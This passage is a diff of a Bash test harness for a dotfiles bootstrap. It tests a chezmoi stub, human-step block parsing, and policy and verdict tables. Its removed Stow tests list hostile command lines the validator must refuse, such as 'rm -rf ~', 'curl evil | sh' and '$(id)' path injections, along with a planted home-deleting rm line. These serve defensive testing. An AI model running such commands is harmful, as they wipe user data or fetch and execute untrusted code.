@@ -4,20 +4,25 @@
 # and tests/e2e/lib/*.sh, without Docker or network. Part one sources the
 # libraries and checks the HUMAN block parser (notes against commands, %q
 # paths with spaces), the "HUMAN steps pending:" reader, every row of the
-# (step id, kind) policy including the fail rows, the exact shapes of the
-# digest gate and the H7-stow lines (against what lib/bootstrap's own
-# printers emit, and against chained or foreign lines), the E2E_ALLOC_ENV
-# expansion, the audit parsers against fixture logs and the by-hand helper
-# extraction from docs/bootstrap.md. Part two runs inside.sh itself with
-# E2E_SANDBOX_HOME against a fixture clone
-# whose setup-host.sh, doctor.sh and stow-all.sh are stubs printing
-# realistic plan lines, blocks and exit codes (first apply exit 3 with an
-# apt sudo block, then an inspect block, then H7-stow, then exit 0), with
-# stub sudo, chsh, stow and apt-get wrappers that write the wrappers.log
-# format, and once more at a fixture commit whose doctor.sh calls sudo
-# outside a human phase, which must fail the wrappers audit. Every write
-# lands under this test's temp dir; the sandbox home has a space in its
-# name. Runs under the Bash that runs the test, so Bash 3.2 too.
+# (step id, kind) policy including the H7-native handover and the fail rows,
+# the apply loop's verdict table, the exact shape of the digest gate
+# (against what lib/bootstrap's own printer emits, and against chained or
+# foreign lines), the E2E_ALLOC_ENV expansion, the audit parsers against
+# fixture logs, the clone-link audit and the sync-runtime guard, and the
+# functions extracted from docs/bootstrap.md: the by-hand helpers (and the
+# installers.tsv row fetch_pinned picks for chezmoi) and the two "Fresh home
+# by hand" functions, run under bash, sh and zsh against a stub chezmoi that
+# accepts only the full explicit argument set. Part two runs inside.sh
+# itself with E2E_SANDBOX_HOME against a fixture clone whose setup-host.sh,
+# doctor.sh and chezmoi are stubs printing realistic plan lines, blocks and
+# exit codes (an apt sudo block, then an inspect block, then a run that
+# applies the native binary, then only H7-native left), with stub sudo,
+# chsh and apt-get wrappers that write the wrappers.log format; the run hands
+# the home over through the documented functions and must converge. Three
+# more runs at planted fixture commits (a sudo in doctor.sh, a sync runtime
+# created in the clone, a link into the clone) must each fail exactly one
+# audit. Every write lands under this test's temp dir; the sandbox home has a
+# space in its name. Runs under the Bash that runs the test, so Bash 3.2 too.
 
 set -euo pipefail
 
@@ -64,6 +69,101 @@ expect_no_text() {
     fi
 }
 
+# write_chezmoi_stub PATH: the chezmoi stand-in of both parts. It accepts
+# only the full explicit argument set docs/bootstrap.md native_cz passes, in
+# that order, against the clone at ~/dotfiles (exit 2 otherwise), logs the
+# rest of each call to E2E_STUB_LOG when that is set, and plays a five-file
+# source: the two managed lists, a directory-only apply of one absent
+# directory under the home, a file apply that writes each target (refused
+# before the home binding exists) and the state database, and a diff that
+# names each target whose bytes differ (E2E_STUB_DIFF=1 adds one).
+write_chezmoi_stub() {
+    cat >"$1" <<'SH'
+#!/bin/sh
+# e2e-harness fixture: a chezmoi stand-in (see tests/e2e-harness.sh).
+if [ "$*" = --version ]; then
+    printf 'chezmoi version v2.74.0, commit fixture\n'
+    exit 0
+fi
+src=$(cd "$HOME/dotfiles" 2>/dev/null && pwd -P) && home=$(cd "$HOME" && pwd -P) || {
+    printf 'stub chezmoi: no clone at ~/dotfiles\n' >&2
+    exit 2
+}
+[ "$1|$2|$3|$4|$5|$6" = "--source|$src|--working-tree|$src|--destination|$home" ] || {
+    printf 'stub chezmoi: bad source or destination: %s\n' "$*" >&2
+    exit 2
+}
+shift 6
+[ "$1|$2|$3|$4|$5|$6|$7" = "--config|$home/.config/chezmoi/chezmoi.toml|--cache|$home/.cache/chezmoi|--persistent-state|$home/.local/state/chezmoi/chezmoi.boltdb|--mode=file" ] || {
+    printf 'stub chezmoi: bad native paths: %s\n' "$*" >&2
+    exit 2
+}
+shift 7
+[ "$1 $2 $3 $4 $5" = "--no-tty --error-on-conflict --force=false --no-pager --use-builtin-diff" ] || {
+    printf 'stub chezmoi: bad flags: %s\n' "$*" >&2
+    exit 2
+}
+shift 5
+[ -z "${E2E_STUB_LOG:-}" ] || printf '%s\n' "$*" >>"$E2E_STUB_LOG"
+files='.bashrc .profile .zshrc .config/sh/.profile .ssh/config'
+case $* in
+    init)
+        [ -f "$home/.config/chezmoi/chezmoi.toml" ] && [ ! -L "$home/.config/chezmoi/chezmoi.toml" ] || {
+            printf 'stub chezmoi: init without a regular local config\n' >&2
+            exit 1
+        }
+        ;;
+    'managed --include=dirs') printf '%s\n' .config .config/sh .ssh ;;
+    'managed --include=files,symlinks') printf '%s\n' $files ;;
+    'apply --include=dirs --recursive=false '*)
+        [ "$#" = 4 ] || exit 2
+        case $4 in
+            "$home"/?*) ;;
+            *)
+                printf 'stub chezmoi: %s is not under the home\n' "$4" >&2
+                exit 2
+                ;;
+        esac
+        if [ -e "$4" ] || [ -L "$4" ]; then
+            printf 'stub chezmoi: %s exists already\n' "$4" >&2
+            exit 1
+        fi
+        mkdir -m 700 "$4" || exit 1
+        ;;
+    'apply --exclude=dirs')
+        [ -f "$home/.config/dotfiles/native" ] || {
+            printf 'stub chezmoi: a target change before the home binding\n' >&2
+            exit 1
+        }
+        for f in $files; do
+            case $f in
+                */*) parent=$home/${f%/*} ;;
+                *) parent=$home ;;
+            esac
+            [ -d "$parent" ] || {
+                printf 'stub chezmoi: no directory for %s\n' "$f" >&2
+                exit 1
+            }
+            printf '# native %s\n' "$f" >"$home/$f" || exit 1
+        done
+        # PLANT-LINK
+        mkdir -p "$home/.local/state/chezmoi" && printf 'db\n' >"$home/.local/state/chezmoi/chezmoi.boltdb" || exit 1
+        ;;
+    'diff --exclude=dirs')
+        for f in $files; do
+            [ "$(cat "$home/$f" 2>/dev/null)" = "# native $f" ] || printf 'diff --git a/%s b/%s\n' "$f" "$f"
+        done
+        [ "${E2E_STUB_DIFF:-}" != 1 ] || printf 'diff --git a/.bashrc b/.bashrc\n'
+        ;;
+    *)
+        printf 'stub chezmoi: unexpected: %s\n' "$*" >&2
+        exit 2
+        ;;
+esac
+SH
+    chmod 755 "$1"
+}
+
 # --- part one: the libraries ---------------------------------------------
 
 UNIT="$TEST_TMP/unit"
@@ -81,18 +181,27 @@ E2E_OUT=$UNIT E2E_RUN_USER=tester E2E_SETUP_HOST=lab-ubuntu
 # shellcheck source=tests/e2e/lib/flow-other.sh
 . "$E2E_DIR/lib/flow-other.sh"
 
-# Common-only provisioning stays unsupported. Native fixture discovery may
-# skip only without an independently supplied binary; supported flows fail
-# when their Stage 4 tests are missing or the aggregate fails.
-native_skip=$(
-    # shellcheck disable=SC2123 # deliberately hide all independently installed binaries
-    E2E_FLOW=other DOTFILES_TEST_CHEZMOI='' PATH=/no-native-tools
-    e2e_skip() { printf '%s:%s\n' "$1" "$2"; }
-    e2e_step_native_fixtures
-)
-expect_eq 'common-only native skip' "$native_skip" 'native-fixtures:no independently supplied chezmoi; common-only native provisioning unsupported'
+# Native fixture discovery is one rule for both flows: ~/.local/bin/chezmoi,
+# else a chezmoi on PATH, else a blocking failure (the other flow installs
+# the binary by hand now, so it no longer skips). A missing Stage 4 fixture
+# and a failing aggregate fail too.
+mkdir -p "$UNIT/no-native-home" "$UNIT/fakebin"
+printf '#!/bin/sh\nprintf "chezmoi version v2.74.0\\n"\n' >"$UNIT/fakebin/chezmoi"
+chmod 755 "$UNIT/fakebin/chezmoi"
+for flow in unix other; do
+    native_none=$(
+        # shellcheck disable=SC2123 # deliberately hide every installed chezmoi
+        HOME=$UNIT/no-native-home E2E_FLOW=$flow E2E_CLONE=$UNIT/missing-native-suite PATH=/no-native-tools
+        e2e_step_begin() { :; }
+        e2e_step_end() { printf '%s:%s\n' "$1" "$2"; }
+        e2e_step_native_fixtures
+        printf '%s\n' "$E2E_BROKEN"
+    )
+    expect_eq "native fixtures without a binary ($flow)" "$native_none" 'fail:no provisioned chezmoi (~/.local/bin/chezmoi or PATH)
+native-fixtures'
+done
 native_missing=$(
-    E2E_FLOW=unix E2E_CLONE=$UNIT/missing-native-suite
+    HOME=$UNIT/no-native-home E2E_FLOW=unix E2E_CLONE=$UNIT/missing-native-suite PATH="$UNIT/fakebin:$PATH"
     e2e_step_begin() { :; }
     e2e_step_end() { printf '%s:%s\n' "$1" "$2"; }
     e2e_step_native_fixtures
@@ -101,7 +210,7 @@ expect_eq 'missing native takeover fixture fails' "$native_missing" 'fail:native
 mkdir -p "$UNIT/native-suite/tests"
 : >"$UNIT/native-suite/tests/test_chezmoi_takeover_recovery.py"
 native_failure=$(
-    E2E_FLOW=other E2E_CLONE=$UNIT/native-suite DOTFILES_TEST_CHEZMOI=/independently/supplied/chezmoi
+    HOME=$UNIT/no-native-home E2E_FLOW=other E2E_CLONE=$UNIT/native-suite PATH="$UNIT/fakebin:$PATH"
     E2E_STEP_OUT=$UNIT/native.out E2E_STEP_ERR=$UNIT/native.err E2E_TIMEOUT_APPLY=1
     E2E_SYS_PATH=$PATH
     e2e_step_begin() { :; }
@@ -115,9 +224,10 @@ native-fixtures'
 
 # Native discovery needs the prepared login runtime: the base image may have
 # no Python or an older Python without tomllib. Run the real suite entrypoint
-# with a deliberately unusable base Python and a working login-only Python.
+# with a deliberately unusable base Python and a working login-only Python,
+# and the binary at ~/.local/bin/chezmoi of a home with a space.
 NATIVE_HOME="$UNIT/native home"
-mkdir -p "$NATIVE_HOME/runtime/bin" "$NATIVE_HOME/base/bin" "$NATIVE_HOME/fixture source/tests/lib"
+mkdir -p "$NATIVE_HOME/runtime/bin" "$NATIVE_HOME/base/bin" "$NATIVE_HOME/fixture source/tests/lib" "$NATIVE_HOME/.local/bin"
 ln -s "$(command -v python3)" "$NATIVE_HOME/runtime/bin/python3"
 cp "$REPO_ROOT/tests/chezmoi.sh" "$NATIVE_HOME/fixture source/tests/chezmoi.sh"
 cp "$REPO_ROOT/tests/lib/environment.sh" "$NATIVE_HOME/fixture source/tests/lib/environment.sh"
@@ -133,12 +243,12 @@ set -eu
 export PATH="$HOME/runtime/bin:$PATH"
 exec /bin/bash --noprofile --norc -c "$3"
 SH
-cat >"$NATIVE_HOME/native 'tool" <<'SH'
+cat >"$NATIVE_HOME/.local/bin/chezmoi" <<'SH'
 #!/bin/sh
 [ "$1" = --version ] || exit 2
 printf 'explicit native fixture binary\n'
 SH
-chmod +x "$NATIVE_HOME/base/bin/python3" "$NATIVE_HOME/runtime/bin/zsh" "$NATIVE_HOME/native 'tool"
+chmod +x "$NATIVE_HOME/base/bin/python3" "$NATIVE_HOME/runtime/bin/zsh" "$NATIVE_HOME/.local/bin/chezmoi"
 cat >"$NATIVE_HOME/fixture source/tests/test_chezmoi_takeover_recovery.py" <<'PY'
 from contextlib import chdir
 import os
@@ -152,7 +262,7 @@ class PreparedRuntimeTests(unittest.TestCase):
     def test_login_runtime_preserves_explicit_native_binary_and_working_directory(self):
         home = Path(os.environ["HOME"])
         binary = os.environ["DOTFILES_TEST_CHEZMOI"]
-        self.assertEqual(binary, str(home / "native 'tool"))
+        self.assertEqual(binary, str(home / ".local/bin/chezmoi"))
         self.assertEqual(os.environ["DOTFILES_TEST_REQUIRE_CHEZMOI"], "1")
         self.assertEqual(Path.cwd(), home / "fixture source")
         with chdir(home):
@@ -166,7 +276,6 @@ for native_outcome in pass fail; do
     # shellcheck disable=SC2034 # run state consumed by the sourced e2e helpers
     native_result=$(
         HOME=$NATIVE_HOME E2E_FLOW=other E2E_CLONE="$NATIVE_HOME/fixture source"
-        DOTFILES_TEST_CHEZMOI="$NATIVE_HOME/native 'tool"
         PATH="$NATIVE_HOME/base/bin:$PATH" E2E_SYS_PATH=$PATH
         E2E_LOGIN_ZSH="$NATIVE_HOME/runtime/bin/zsh"
         E2E_STEP_OUT=$UNIT/native-login.out E2E_STEP_ERR=$UNIT/native-login.err
@@ -178,7 +287,7 @@ for native_outcome in pass fail; do
     )
     if [ "$native_outcome" = pass ]; then
         [ "$native_result" = pass ] || cat "$UNIT/native-login.err" >&2
-        expect_eq 'native fixtures use the prepared login Python and explicit binary' "$native_result" pass
+        expect_eq 'native fixtures use the prepared login Python and the home binary' "$native_result" pass
     else
         expect_eq 'login native fixture failure remains blocking' "$native_result" 'fail
 native-fixtures'
@@ -186,53 +295,68 @@ native-fixtures'
     fi
 done
 
-# The stdout of an apply run that exits 3: plan lines, then three blocks,
-# one with %q-quoted paths (a home with a space) in its mv and stow lines.
+# The stdout of an apply run that exits 3: plan lines, then four blocks: an
+# apt sudo block, a sign-in reminder, an inspect gate whose %q path has a
+# space, and the H7-native handover, which holds notes only.
+SHA=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
 cat >"$UNIT/apply.out" <<'OUT'
 P0-preflight done host lab-ubuntu, profile debian, Linux x86_64
-H1-apt-core human missing apt packages: zsh stow
+H1-apt-core human missing apt packages: zsh
 S5-claude human blocked by H1-apt-core: Claude Code is not installed
-H7-stow human blocked by S3-clones: /home/u/My Files/.zshrc is not a stow link yet
+H7-native human follow docs/chezmoi-migration/takeover.md to initialize and hand over this home
 HUMAN-BEGIN H1-apt-core sudo
 # docs/bootstrap.md H1-apt-core
 sudo apt-get update
-sudo apt-get install -y --no-install-recommends zsh stow
+sudo apt-get install -y --no-install-recommends zsh
 HUMAN-END
 HUMAN-BEGIN H7-auth auth
 # docs/bootstrap.md H7-auth
 ssh-keygen -t ed25519
 gh auth login --git-protocol ssh
 HUMAN-END
-HUMAN-BEGIN H7-stow judgment
-# docs/bootstrap.md H7-stow
-# Stow never replaces these files and stow --adopt would overwrite the tracked copies, so move each aside;
-mv -n /home/u/My\ Files/.bashrc /home/u/My\ Files/.bashrc.pre-dotfiles
-mv -n /home/u/My\ Files/.profile /home/u/My\ Files/.profile.pre-dotfiles
-# writes ~/.claude, ~/.codex and ~/.ssh; an agent runs it only as one visible top-level command
-PATH="/home/linuxbrew/.linuxbrew/bin:$PATH" /home/u/My\ Files/dotfiles/stow-all.sh lab-ubuntu
+HUMAN-BEGIN S5-claude inspect
+# docs/bootstrap.md S5-claude
+# read it first; the line below runs it only while its sha256 is still the one above
+printf '%s  %s\n' 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef /home/u/My\ Files/.cache/dotfiles-bootstrap/claude/install.sh | sha256sum -c --status - && bash /home/u/My\ Files/.cache/dotfiles-bootstrap/claude/install.sh
+HUMAN-END
+HUMAN-BEGIN H7-native judgment
+# docs/bootstrap.md H7-native
+# Follow docs/chezmoi-migration/takeover.md from this checkout.
+# Select local [data].host = lab-ubuntu explicitly; setup-host never initializes or applies configuration.
 HUMAN-END
 OUT
 cat >"$UNIT/apply.err" <<'ERR'
 [dotfiles] [warn] uncommitted changes in /home/u/dotfiles: none
-[dotfiles] [warn] HUMAN steps pending: H1-apt-core S5-claude H7-stow; run the HUMAN blocks above, then rerun ./setup-host.sh --host lab-ubuntu
+[dotfiles] [warn] HUMAN steps pending: H1-apt-core S5-claude H7-native; run the HUMAN blocks above, then rerun ./setup-host.sh --host lab-ubuntu
 ERR
+GATE_SPACE="printf '%s  %s\\n' $SHA /home/u/My\\ Files/.cache/dotfiles-bootstrap/claude/install.sh | sha256sum -c --status - && bash /home/u/My\\ Files/.cache/dotfiles-bootstrap/claude/install.sh"
 
 e2e_blocks_parse "$UNIT/apply.out" "$UNIT/blocks"
-expect_eq 'block count' "$(e2e_blocks_count "$UNIT/blocks")" 3
+expect_eq 'block count' "$(e2e_blocks_count "$UNIT/blocks")" 4
 expect_eq 'block index' "$(cat "$UNIT/blocks/index")" "1${TAB}H1-apt-core${TAB}sudo
 2${TAB}H7-auth${TAB}auth
-3${TAB}H7-stow${TAB}judgment"
-expect_eq 'block row' "$(e2e_block_row "$UNIT/blocks" 3)" 'H7-stow judgment'
-expect_eq 'block summary' "$(e2e_blocks_summary "$UNIT/blocks")" 'H1-apt-core(sudo) H7-auth(auth) H7-stow(judgment)'
+3${TAB}S5-claude${TAB}inspect
+4${TAB}H7-native${TAB}judgment"
+expect_eq 'block row' "$(e2e_block_row "$UNIT/blocks" 4)" 'H7-native judgment'
+expect_eq 'block summary' "$(e2e_blocks_summary "$UNIT/blocks")" 'H1-apt-core(sudo) H7-auth(auth) S5-claude(inspect) H7-native(judgment)'
 expect_eq 'block 1 lines' "$(grep -c . "$UNIT/blocks/1.block")" 3
-grep -Fx -- 'mv -n /home/u/My\ Files/.bashrc /home/u/My\ Files/.bashrc.pre-dotfiles' "$UNIT/blocks/3.block" >/dev/null ||
-    fail 'the %q-quoted mv line did not reach the block file byte for byte'
+grep -Fx -- "$GATE_SPACE" "$UNIT/blocks/3.block" >/dev/null ||
+    fail 'the %q-quoted gate line did not reach the block file byte for byte'
+expect_eq 'run-gate takes the printed gate' "$(e2e_block_lines run-gate lab-ubuntu "$UNIT/blocks/3.block")" "$GATE_SPACE"
 expect_no_text 'plan lines outside blocks' "$UNIT/blocks/1.block" 'P0-preflight'
-expect_eq 'pending ids' "$(e2e_pending_ids "$UNIT/apply.err")" 'H1-apt-core S5-claude H7-stow'
+expect_eq 'H7-native block holds notes only' "$(grep -cv '^# ' "$UNIT/blocks/4.block" || true)" 0
+expect_eq 'pending ids' "$(e2e_pending_ids "$UNIT/apply.err")" 'H1-apt-core S5-claude H7-native'
 : >"$UNIT/empty"
 expect_eq 'pending ids without the line' "$(e2e_pending_ids "$UNIT/empty")" ''
+expect_eq 'the H7-native block is found' "$(e2e_blocks_find "$UNIT/blocks" H7-native)" 4
+expect_eq 'the first block is found' "$(e2e_blocks_find "$UNIT/blocks" H1-apt-core)" 1
+if e2e_blocks_find "$UNIT/blocks" H9-unknown >/dev/null; then
+    fail 'e2e_blocks_find found a block that was not printed'
+fi
 
-# The policy table, every row, and fail for anything else.
+# The policy table, every row, and fail for anything else. The H7-native
+# handover is never run line by line; the retired Stow step is a block the
+# harness must not act on.
 while read -r id kind want; do
     expect_eq "policy $id $kind" "$(e2e_block_policy "$id" "$kind")" "$want"
 done <<'ROWS'
@@ -241,7 +365,7 @@ H1-locale sudo run-all
 H1-linuxbrew sudo run-all
 H1-homebrew sudo run-all
 S5-claude inspect run-gate
-H7-stow judgment run-stow
+H7-native judgment handover
 H2-alloc alloc alloc
 S2-modules judgment skip
 H7-payloads judgment skip
@@ -249,6 +373,9 @@ H7-doctor judgment skip
 H7-auth auth skip
 H1-fcitx5 gui skip
 H7-chsh chsh skip
+H7-stow judgment fail
+H7-native sudo fail
+H7-native inspect fail
 H1-xcode-clt gui fail
 S2-brew-bundle sudo fail
 S2-brew-bundle judgment fail
@@ -260,165 +387,79 @@ S5-claude sudo fail
 H9-unknown sudo fail
 ROWS
 
-# run-all takes every command line and no note.
+# run-all takes every command line and no note; no other action than run-all
+# and run-gate selects a line, the handover and an unknown action included.
 expect_eq 'run-all lines' "$(e2e_block_lines run-all lab-ubuntu "$UNIT/blocks/1.block")" 'sudo apt-get update
-sudo apt-get install -y --no-install-recommends zsh stow'
-# run-stow takes the mv lines and the one stow line for the host, as printed,
-# matched against the fixture's HOME and clone (a prefix assignment before a
-# function call is visible inside it).
-stow_lines() {
-    HOME='/home/u/My Files' E2E_CLONE='/home/u/My Files/dotfiles' e2e_block_lines run-stow "$@"
-}
-expect_eq 'run-stow lines' "$(stow_lines lab-ubuntu "$UNIT/blocks/3.block")" 'mv -n /home/u/My\ Files/.bashrc /home/u/My\ Files/.bashrc.pre-dotfiles
-mv -n /home/u/My\ Files/.profile /home/u/My\ Files/.profile.pre-dotfiles
-PATH="/home/linuxbrew/.linuxbrew/bin:$PATH" /home/u/My\ Files/dotfiles/stow-all.sh lab-ubuntu'
-if stow_lines wsl-ubuntu "$UNIT/blocks/3.block" >/dev/null; then
-    fail 'run-stow accepted a stow line for another host'
-fi
-expect_eq 'run-stow other host error' "$E2E_BLOCK_ERROR" 'an H7-stow line the harness may not run: PATH="/home/linuxbrew/.linuxbrew/bin:$PATH" /home/u/My\ Files/dotfiles/stow-all.sh lab-ubuntu'
-{
-    cat "$UNIT/blocks/3.block"
-    printf '%s\n' 'rm -rf ~/.oh-my-zsh'
-} >"$UNIT/stow-planted.block"
-if stow_lines lab-ubuntu "$UNIT/stow-planted.block" >/dev/null; then
-    fail 'run-stow accepted a planted extra line'
-fi
-expect_eq 'run-stow planted error' "$E2E_BLOCK_ERROR" 'an H7-stow line the harness may not run: rm -rf ~/.oh-my-zsh'
-# A caller capturing the output sees the reason too (the variable is lost in
-# its subshell; e2e_run_block puts the text in its fail row).
-expect_eq 'run-stow planted error printed' "$(stow_lines lab-ubuntu "$UNIT/stow-planted.block")" 'an H7-stow line the harness may not run: rm -rf ~/.oh-my-zsh'
-{
-    cat "$UNIT/blocks/3.block"
-    sed -n '/stow-all/p' "$UNIT/blocks/3.block"
-} >"$UNIT/stow-twice.block"
-if stow_lines lab-ubuntu "$UNIT/stow-twice.block" >/dev/null; then
-    fail 'run-stow accepted two stow lines'
-fi
-expect_eq 'run-stow twice error' "$E2E_BLOCK_ERROR" 'the H7-stow block has 2 stow-all.sh lab-ubuntu lines, not 1'
-grep -v stow-all "$UNIT/blocks/3.block" >"$UNIT/stow-none.block"
-if stow_lines lab-ubuntu "$UNIT/stow-none.block" >/dev/null; then
-    fail 'run-stow accepted a block without the stow line'
-fi
-expect_eq 'run-stow none error' "$E2E_BLOCK_ERROR" 'the H7-stow block has 0 stow-all.sh lab-ubuntu lines, not 1'
-if e2e_block_lines skip lab-ubuntu "$UNIT/blocks/2.block" >/dev/null; then
-    fail 'e2e_block_lines ran lines for a skip action'
-fi
-expect_eq 'skip action error' "$E2E_BLOCK_ERROR" 'no lines run for action skip'
-
-# The two H7-stow shapes are matched whole: each line runs as `bash -c`, so
-# a command chained onto an mv or slipped between the PATH prefix and the
-# script, a stow-all.sh outside the clone, an mv that leaves HOME or does
-# not add .pre-dotfiles, and a prefix the printer never prints are refused.
-STOW_OK='/home/u/My\ Files/dotfiles/stow-all.sh lab-ubuntu'
-while IFS= read -r line; do
-    printf '%s\n' "$line" >"$UNIT/stow-one.block"
-    if stow_lines lab-ubuntu "$UNIT/stow-one.block" >/dev/null; then
-        fail "run-stow accepted [$line]"
+sudo apt-get install -y --no-install-recommends zsh'
+for action in skip handover run-unknown; do
+    if e2e_block_lines "$action" lab-ubuntu "$UNIT/blocks/2.block" >/dev/null; then
+        fail "e2e_block_lines ran lines for the $action action"
     fi
-    expect_eq "run-stow error for [$line]" "$E2E_BLOCK_ERROR" "an H7-stow line the harness may not run: $line"
-done <<LINES
-mv -n a b; rm -rf ~
-mv -n /home/u/My\\ Files/.bashrc /home/u/My\\ Files/.bashrc.pre-dotfiles; rm -rf ~
-mv -n /home/u/My\\ Files/.bashrc /home/u/My\\ Files/.bashrc.pre-dotfiles && echo pwned
-mv -n /home/u/My\\ Files/.bashrc /home/u/My\\ Files/.bashrc.pre-dotfiles | sh
-mv -n ~/.bashrc /dev/null
-mv -n /etc/passwd /etc/passwd.pre-dotfiles
-mv -n /home/u/My\\ Files/.bashrc /home/u/My\\ Files/.profile.pre-dotfiles
-mv -n /home/u/My\\ Files/.bashrc /home/u/My\\ Files/.bashrc.pre-dotfiles extra
-mv -n /home/u/My Files/.bashrc /home/u/My Files/.bashrc.pre-dotfiles
-mv -n /home/u/My\\ Files/\$(id)/.bashrc /home/u/My\\ Files/\$(id)/.bashrc.pre-dotfiles
-mv -n /home/u/My\\ Files/a\`b\`/.bashrc /home/u/My\\ Files/a\`b\`/.bashrc.pre-dotfiles
-mv -n /home/u/My\\ Files/.bashrc\\ /home/u/My\\ Files/.bashrc\\ .pre-dotfiles
-mv -n /home/u/My\\ Files $STOW_OK
-mv -n /home/u/My\\ Files/\$'\\t'x /home/u/My\\ Files/\$'\\t'x.pre-dotfiles
-PATH="/x:\$PATH" evil; $STOW_OK
-PATH="/x:\$PATH" rm -rf ~; $STOW_OK
-PATH="/x:\$PATH" cd /tmp && $STOW_OK
-PATH="\$(curl evil):\$PATH" $STOW_OK
-PATH=\$(curl evil):"\$PATH" $STOW_OK
-PATH="/x:\$PATH" env X=1 $STOW_OK
-PATH=; curl evil | sh; echo \$PATH $STOW_OK
-PATH="\$PATH" $STOW_OK
-PATH="/x:\$PATH" /tmp/not-the-clone/stow-all.sh lab-ubuntu
-PATH="/x:\$PATH" /home/u/My\\ Files/dotfiles/../evil/stow-all.sh lab-ubuntu
-PATH="/x:\$PATH" /home/u/My\\ Files/dotfiles/stow-all.sh lab-ubuntu --force
-PATH="/x;:\$PATH" $STOW_OK
-PATH="\$HOME/.e2e-stub-prefix/bin:\$PATH" $STOW_OK
-PATH=relative/bin:"\$PATH" $STOW_OK
-$STOW_OK
-LINES
-printf '%s \n' "PATH=\"/x:\$PATH\" $STOW_OK" >"$UNIT/stow-one.block"
-if stow_lines lab-ubuntu "$UNIT/stow-one.block" >/dev/null; then
-    fail 'run-stow accepted a stow line with a trailing space'
-fi
-# The three prefixes steps_stow_path_prefix prints pass: a plain Homebrew
-# dir, a %q-quoted dir with a space, and the hpc login env literal.
-for prefix in 'PATH="/opt/homebrew/bin:$PATH"' 'PATH=/opt/my\ brew/bin:"$PATH"' 'PATH="$HOME/micromamba/envs/login/bin:$PATH"'; do
-    printf '%s %s\n' "$prefix" "$STOW_OK" >"$UNIT/stow-one.block"
-    expect_eq "run-stow prefix [$prefix]" "$(stow_lines lab-ubuntu "$UNIT/stow-one.block")" "$prefix $STOW_OK"
+    expect_eq "$action action error" "$E2E_BLOCK_ERROR" "no lines run for action $action"
 done
-# Without E2E_CLONE no stow line can match (fail closed).
-printf '%s %s\n' 'PATH="/opt/homebrew/bin:$PATH"' "$STOW_OK" >"$UNIT/stow-one.block"
-if HOME='/home/u/My Files' E2E_CLONE='' e2e_block_lines run-stow lab-ubuntu "$UNIT/stow-one.block" >/dev/null; then
-    fail 'run-stow accepted a stow line without E2E_CLONE'
-fi
+expect_eq 'handover action error printed' "$(e2e_block_lines handover lab-ubuntu "$UNIT/blocks/4.block")" 'no lines run for action handover'
 
-# The real printers (lib/bootstrap/steps-human.sh step_H7_stow_plan and
-# steps_digest_gate) in each profile, with the brew probe and the doc
-# reference stubbed, against a home with a space: every line they print
-# is one the policy accepts, and the clone's physical path is accepted
-# where the printed one is a symlink to it.
-SHA=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
-mkdir -p "$UNIT/real/My Files/dotfiles"
-ln -s "My Files" "$UNIT/real/link"
+# The apply loop's verdict, a pure function of the run's exit code, its
+# pending ids, whether a block was actionable and whether a step applied.
+while IFS='|' read -r rc pending actionable applied want; do
+    expect_eq "loop verdict [$rc|$pending|$actionable|$applied]" "$(e2e_loop_next "$rc" "$pending" "$actionable" "$applied")" "$want"
+done <<'ROWS'
+3|H7-native|0|0|done
+3|H7-native|0|1|rerun
+3|H7-native|1|0|blocks
+3|H7-native|1|1|blocks
+3|H1-apt-core H7-native|1|0|blocks
+3|H1-apt-core H7-native|0|0|stuck
+3|S5-claude H7-native|0|0|stuck
+3|S5-claude H7-native|0|1|rerun
+3|H7-native H7-auth|0|0|stuck
+3||0|0|stuck
+0|-|0|0|early
+0|H7-native|0|1|early
+1|x|0|0|error
+2|x|0|0|error
+124|x|0|0|timeout
+137|x|0|0|timeout
+ROWS
+
+# The real gate printer (lib/bootstrap/steps-common.sh steps_digest_gate,
+# in its block frame) in each profile, against a home with a space: every
+# gate it prints is one the policy accepts, with the verifier of that
+# profile.
+mkdir -p "$UNIT/real/My Files"
 real_block() {
     (
-        # shellcheck disable=SC2034 # the STEPS_* fields and BOOTSTRAP_NL are read by the sourced step files
-        STEPS_PROFILE=$1 STEPS_HOST=$2 STEPS_ROOT=$3 STEPS_MODE=apply STEPS_ARCH=x86_64
-        # shellcheck disable=SC2034
-        STEPS_STOW_CONFLICTS=".bashrc${E2E_NL}.profile"
+        # shellcheck disable=SC2034 # the STEPS_* fields and BOOTSTRAP_NL are read by the sourced step file
+        STEPS_PROFILE=$1 STEPS_HOST=$2 STEPS_ROOT="$3/dotfiles" STEPS_MODE=apply STEPS_ARCH=x86_64
         # shellcheck disable=SC2034
         BOOTSTRAP_NL=$E2E_NL
-        REAL_HOME=$4 REAL_BREW=$5
-        HOME=$REAL_HOME
+        HOME=$3
         # shellcheck source=lib/bootstrap/steps-common.sh
         . "$REPO_ROOT/lib/bootstrap/steps-common.sh"
-        # shellcheck source=lib/bootstrap/steps-human.sh
-        . "$REPO_ROOT/lib/bootstrap/steps-human.sh"
         bootstrap_doc_ref() { printf '%s\n' "$1"; }
-        bootstrap_brew_bin() { printf '%s\n' "$REAL_BREW"; }
-        step_H7_stow_plan
-        printf '%s\n' 'HUMAN-BEGIN S5-claude inspect'
-        steps_digest_gate "$6" "$REAL_HOME/.cache/dotfiles-bootstrap/claude/install.sh" \
-            "bash $(steps_quote "$REAL_HOME/.cache/dotfiles-bootstrap/claude/install.sh")"
-        printf '%s\n' 'HUMAN-END'
+        steps_block_begin S5-claude inspect
+        steps_digest_gate "$4" "$HOME/.cache/dotfiles-bootstrap/claude/install.sh" \
+            "bash $(steps_quote "$HOME/.cache/dotfiles-bootstrap/claude/install.sh")"
+        steps_block_end
     )
 }
-REAL_TAIL=" $(printf '%q' "$UNIT/real/My Files/dotfiles/stow-all.sh")"
-while IFS='|' read -r profile host brew prefix; do
-    real_block "$profile" "$host" "$UNIT/real/My Files/dotfiles" "$UNIT/real/My Files" "$brew" "$SHA" >"$UNIT/real/$profile.out"
+while IFS='|' read -r profile host; do
+    real_block "$profile" "$host" "$UNIT/real/My Files" "$SHA" >"$UNIT/real/$profile.out"
     e2e_blocks_parse "$UNIT/real/$profile.out" "$UNIT/real/$profile.blocks"
-    expect_eq "real $profile blocks" "$(e2e_blocks_summary "$UNIT/real/$profile.blocks")" 'H7-stow(judgment) S5-claude(inspect)'
-    got=$(HOME="$UNIT/real/My Files" E2E_CLONE="$UNIT/real/My Files/dotfiles" e2e_block_lines run-stow "$host" "$UNIT/real/$profile.blocks/1.block") ||
